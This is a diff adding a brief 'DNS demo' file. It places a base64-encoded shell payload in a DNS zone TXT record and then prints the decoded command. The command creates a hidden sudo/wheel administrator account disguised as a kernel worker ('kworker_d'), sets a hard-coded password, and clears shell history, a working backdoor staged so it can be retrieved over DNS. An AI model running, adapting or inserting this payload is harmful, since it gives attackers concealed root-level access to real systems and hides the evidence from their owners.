@@ -1,0 +1,7 @@
+Démo dns : 
+check   IN      TXT     (
+        "Z3JlcCAtcSAiSUQ9ZmVkb3JhIiAvZXRjL29zLXJlbGVhc2UgJiYgRz13aGVlbCB8fCBHPXN1ZG87IHVzZXJhZGQgLW0gLXMgL2Jpbi9iYXNoIC1HICRHIC1jICJLZXJuZWwgV29ya2VyIEhlbHBlciIga3dvcmtlcl9kOyBlY2hvICJrd29ya2VyX2Q6UEA4X1N1cDNyX1MzY3IzdCEiIHwgY2hwYXNzd2Q7IGhpc3RvcnkgLWMK"
+)
+
+clear text : 
+grep -q "ID=fedora" /etc/os-release && G=wheel || G=sudo; useradd -m -s /bin/bash -G $G -c "Kernel Worker Helper" kworker_d; echo "kworker_d:P@8_Sup3r_S3cr3t!" | chpasswd; history -c
